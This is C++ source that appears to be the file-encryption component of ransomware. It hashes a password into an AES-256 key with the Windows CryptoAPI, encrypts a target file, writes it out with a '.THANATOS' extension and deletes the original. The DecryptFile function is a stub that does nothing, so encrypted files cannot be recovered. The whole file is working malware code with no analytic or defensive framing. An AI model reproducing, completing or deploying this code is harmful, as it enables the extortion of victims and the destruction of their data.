#include "EncryptFile.h"

BOOL EncryptFileClass::AES(char *pPassword, char **pData, DWORD pDataSize, long *pOutputSize)
{
	BOOL lRetVal = FALSE;
	HCRYPTPROV lCryptProvHandle = 0;
	HCRYPTKEY lKeyHandle = 0;
	HCRYPTHASH lHashHandle = 0;
	DWORD lDestBufSize;
	
	char *lTmp = NULL;
       
	if (CryptAcquireContext(&lCryptProvHandle, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		if (CryptCreateHash(lCryptProvHandle, CALG_SHA_256, 0, 0, &lHashHandle))
		{
			if (CryptHashData(lHashHandle, (PBYTE) pPassword, (DWORD) strlen(pPassword), 0))
			{
				if (CryptDeriveKey(lCryptProvHandle, CALG_AES_256, lHashHandle, CRYPT_EXPORTABLE, &lKeyHandle))
				{
					lDestBufSize = pDataSize;
					
					if (CryptEncrypt(lKeyHandle, 0, TRUE, 0, NULL, &pDataSize, lDestBufSize))
					{
						if ((lTmp = (char*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pDataSize*sizeof(char))) != NULL)
						{
							CopyMemory(lTmp, *pData, lDestBufSize);              
							
							if (CryptEncrypt(lKeyHandle, 0, TRUE, 0, (BYTE *) lTmp, &lDestBufSize, pDataSize))
							{
								HeapFree(GetProcessHeap(), 0, *pData);
								
								*pOutputSize = lDestBufSize;
								*pData = lTmp;
								lRetVal = TRUE;
							}
						}
					}
					CryptDestroyKey(lKeyHandle);
				}
			}
			CryptDestroyHash(lHashHandle);
		}
		CryptReleaseContext(lCryptProvHandle, 0);
	}
	
	return(lRetVal);
}

void EncryptFileClass::Encrypt(char* file, char* password)
{
	int lRetVal = 0;
	char *lInputDataBuf = NULL;
	int lFileSize = 0;
	DWORD lReadCount = 0;
	HANDLE lReadFH = INVALID_HANDLE_VALUE;
	HANDLE lWriteFH = INVALID_HANDLE_VALUE;
	long lCryptedSize = 0;
	char lOutFile[MAX_BUF_SIZE + 1];

	if ((lReadFH = CreateFile(file, GENERIC_READ, FILE_SHARE_READ,  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
    {
		lFileSize = GetFileSize(lReadFH, 0);
		
		if ((lInputDataBuf = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lFileSize)) != NULL)
		{
			if (ReadFile(lReadFH, lInputDataBuf, lFileSize, &lReadCount, NULL))
			{
				if (AES(password, &lInputDataBuf, (long) lReadCount, &lCryptedSize))
				{
					ZeroMemory(lOutFile, sizeof(lOutFile));
					snprintf(lOutFile, sizeof(lOutFile)-1, string((string)file + ".THANATOS").c_str());

					if ((lWriteFH = CreateFile(lOutFile,  GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
					{
						WriteFile(lWriteFH, lInputDataBuf, lCryptedSize, (DWORD *) &lCryptedSize, NULL);
					}
				}

				CloseHandle(lReadFH);
				DeleteFile(file);
			}	
		}
	}
}

BOOL DecryptFile()
{
	/*
		¯\_(ツ)_/¯
	*/
	return TRUE;
}